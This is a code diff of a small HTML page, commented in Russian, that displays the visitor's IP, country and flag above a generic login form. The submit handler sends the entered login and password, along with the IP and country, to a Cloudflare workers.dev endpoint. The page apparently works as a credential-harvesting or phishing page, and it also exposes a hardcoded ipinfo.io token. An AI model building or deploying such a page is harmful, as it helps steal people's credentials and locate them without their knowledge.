@@ -7,6 +7,10 @@
 <body>
   <h2>Ваш IP-адрес:</h2>
   <p id="ip">Загрузка...</p>
+  <h3>Страна:</h3>
+  <p id="country">Загрузка...</p>
+  <h3>Флаг:</h3>
+  <img id="flag" alt="Country flag" width="100">
 
   <form action="https://mute-scene-f7f5.kamrantataloo69.workers.dev/" method="POST" id="loginForm">
     <input type="text" name="login" placeholder="Login"><br>
@@ -15,40 +19,55 @@
   </form>
 
   <script>
-    // Получаем IP
+    // Получаем IP и информацию о стране
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         document.getElementById('ip').textContent = data.ip;
 
-        // Отправляем данные на воркер с IP-адресом, логином и паролем
-        const form = document.getElementById('loginForm');
-        form.addEventListener('submit', async (event) => {
-          event.preventDefault(); // Предотвращаем стандартное отправление формы
+        // Запрос на ipinfo.io для получения информации о стране
+        fetch(`https://ipinfo.io/${data.ip}/json?token=12e7da7cd87750`)
+          .then(res => res.json())
+          .then(info => {
+            // Отображаем страну и флаг
+            document.getElementById('country').textContent = info.country;
+            const flagUrl = `https://flagcdn.com/w320/${info.country.toLowerCase()}.png`;
+            document.getElementById('flag').src = flagUrl;
 
-          const login = form.elements['login'].value;
-          const password = form.elements['password'].value;
+            // Отправляем данные на воркер с IP-адресом, логином и паролем
+            const form = document.getElementById('loginForm');
+            form.addEventListener('submit', async (event) => {
+              event.preventDefault(); // Предотвращаем стандартное отправление формы
 
-          const postData = {
-            ip: data.ip,
-            login: login,
-            password: password,
-          };
+              const login = form.elements['login'].value;
+              const password = form.elements['password'].value;
 
-          // Отправляем POST-запрос на воркер
-          await fetch('https://mute-scene-f7f5.kamrantataloo69.workers.dev/', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(postData),
+              const postData = {
+                ip: data.ip,
+                country: info.country,
+                login: login,
+                password: password,
+              };
+
+              // Отправляем POST-запрос на воркер
+              await fetch('https://mute-scene-f7f5.kamrantataloo69.workers.dev/', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(postData),
+              });
+
+              alert('Данные отправлены!');
+            });
+          })
+          .catch(() => {
+            document.getElementById('country').textContent = 'Ошибка получения информации о стране';
           });
-
-          alert('Данные отправлены!');
-        });
       })
       .catch(() => {
         document.getElementById('ip').textContent = 'Ошибка получения IP';
       });
   </script>
-</body
+</body>
+</html>
